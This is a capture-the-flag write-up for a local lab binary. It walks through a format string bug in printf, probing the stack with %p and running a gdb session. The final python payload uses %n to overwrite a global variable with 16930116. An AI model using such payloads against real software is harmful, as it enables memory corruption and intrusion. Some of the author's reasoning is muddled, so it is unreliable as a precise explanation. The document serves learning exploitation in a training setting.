## Flag4 README: Finding Flag4

We are now into `/home/user/level4`.

After downloading the binary with:
```sh
scp -P 4343 level4@localhost:/home/user/level4/level4 ~
```
and decompile it with [Dogbolt](https://dogbolt.org/).

In doing so, we realized there a function p which calling printf. So we understood that we need to use a `format string bug`.

What is it ? Simple, we are exploiting printf(s)

first we can find the addres of m
   0x0804848d <+54>:	mov    eax,ds:0x8049810
here he is doing result = m

Now we need to do where we are in the stack let's try to put this
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

AAAA.0xb7ff26b0.0xbffff6f4.0xb7fd0ff4.(nil).(nil).0xbffff6b8.0x804848d.0xbffff4b0.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025.0x70252e70

So our payload is a the adress 0x41414141 so we can search the memory for when we start writing to the stack.

so we now that our adress start at the adress 0xb7ff26b0.

Now we can find what's adress this value belong


So we can put the adress we want then go to this adress by adding %x * 11 (the adress will be stored avec 11 octet see exemle after) and then %n so you can write here.
let's try tris :
(gdb) run <<< $(python -c 'print("\x10\x98\x04\x08" + "%x" * 11 + "%n")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level4/level4 <<< $(python -c 'print("\x10\x98\x04\x08" + "%x" * 11 + "%n")
/bin/bash: -c: line 0: unexpected EOF while looking for matching `''
/bin/bash: -c: line 1: syntax error: unexpected end of file
During startup program exited with code 1.
(gdb) run <<< $(python -c 'print("\x10\x98\x04\x08" + "%x" * 11 + "%n")')
Starting program: /home/user/level4/level4 <<< $(python -c 'print("\x10\x98\x04\x08" + "%x" * 11 + "%n")')
b7ff26b0bffff714b7fd0ff400bffff6d8804848dbffff4d0200b7fd1ac0b7ff37d0

Breakpoint 1, 0x080484a5 in n ()
(gdb) p *0x8049810
$4 = 64

yep we modify the value. Now to modify the value you can justt change the len of all the caratere before. But the value we need to put to the adress is 16930116 and because we dont want to write a string that long what you can do is change the last %x and just put the number before it.
16930116 - 64 = 16930052
```Bash
$(python -c 'print("\x10\x98\x04\x08" + "%x" * 10 + "%16930052x"+ "%n")')
```
and it's work !
